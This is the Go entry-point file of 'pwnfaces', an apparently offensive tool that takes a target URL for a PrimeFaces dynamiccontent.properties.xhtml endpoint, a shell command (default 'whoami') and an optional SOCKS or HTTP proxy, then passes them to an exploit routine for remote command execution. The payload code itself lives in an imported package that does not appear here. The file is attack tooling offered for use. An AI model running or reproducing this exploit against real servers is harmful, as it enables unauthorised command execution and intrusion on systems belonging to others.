package main

import (
	"log"
	"os"

	"github.com/jessevdk/go-flags"
	"github.com/oppsec/pwnfaces/src/interface"
	"github.com/oppsec/pwnfaces/src/pwnfaces"
)

func error(err interface{}) {

	if err != nil {
		log.Fatalln(err)
		os.Exit(0)
	}

}

func main() {

	ui.GetBanner()

	var opts struct {
		Url string `short:"u" long:"url" description:"Definition: Argument used to pass target URL (ex: http://127.0.0.1:8090/javax.faces.resource/dynamiccontent.properties.xhtml)" required:"true"`
		Cmd string `short:"c" long:"cmd" description:"Definition: Argument used to pass the command" required:"false" default:"whoami"`
		Proxy string `short:"p" long:"proxy" description:"Definition: Argument used to pass proxy (SOCKS4, SOCKS4a, SOCKS5 or HTTP)" required:"false"`
	}

	_, err := flags.Parse(&opts)
	error(err)

	check_slash  := opts.Url[len(opts.Url)-1:]

	if check_slash == "/"{
		exploit.TargetConnect(opts.Url, opts.Cmd, opts.Proxy)
	} else if check_slash != "/"{
		exploit.TargetConnect(opts.Url + "/", opts.Cmd, opts.Proxy)
	}
}
